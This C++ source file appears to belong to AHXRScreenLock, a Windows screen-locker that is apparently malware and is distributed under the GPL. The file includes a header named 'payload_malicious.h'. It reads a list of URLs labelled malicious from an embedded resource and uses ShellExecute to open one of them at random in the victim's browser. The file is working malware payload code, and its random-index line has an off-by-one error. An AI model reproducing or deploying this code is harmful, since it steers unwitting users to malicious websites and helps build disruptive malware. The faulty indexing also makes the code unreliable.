/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include					"stdafx.h"
#include					"payload_malicious.h"
#include					"resource1.h"
#include					<string>
#include					<vector>
#include					<sstream>
#include					<Windows.h>
#include					<ctime>
#include					<iterator>

using namespace				std;
template<typename Out> void	split(const std::string &s, char delim, Out result);
std::vector<std::string>	split(const std::string &s, char delim);

vector< string > s_urls;

void readMaliciousURLs() {
	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA2), RT_RCDATA);
	unsigned int i_resource = ::SizeofResource(NULL, hRes);
	LPVOID lpRes = LoadResource(NULL, hRes);
	void * pResourceLock = LockResource(lpRes);

	char * c_mal = (char *)pResourceLock;
	istringstream s_mal(c_mal);
	string s_url;
	string s_format_url;
	vector< string > s_split;

	while (getline(s_mal, s_url)) {
		if (s_url.empty())
			break;

		s_split = split(s_url, ',');

		// Removing quotations
		s_split[1].erase(0, 1);
		s_split[1].erase(s_split[1].end() - 1, s_split[1].end());

		if (s_split[1].compare("-") != 0)
			s_urls.push_back(string("http://" + s_split[1]));
	}
}

void openRandomMaliciousURL() {
	srand(time(NULL));

	int i_rand_url = rand() % s_urls.size() + 1;
	ShellExecute(0, 0, s_urls[i_rand_url].c_str(), 0, 0, SW_SHOW);
}

/*
	https://stackoverflow.com/a/236803
*/
template<typename Out>
void split(const std::string &s, char delim, Out result) {
	std::stringstream ss(s);
	std::string item;
	while (std::getline(ss, item, delim)) {
		*(result++) = item;
	}
}

std::vector<std::string> split(const std::string &s, char delim) {
	std::vector<std::string> elems;
	split(s, delim, std::back_inserter(elems));
	return elems;
}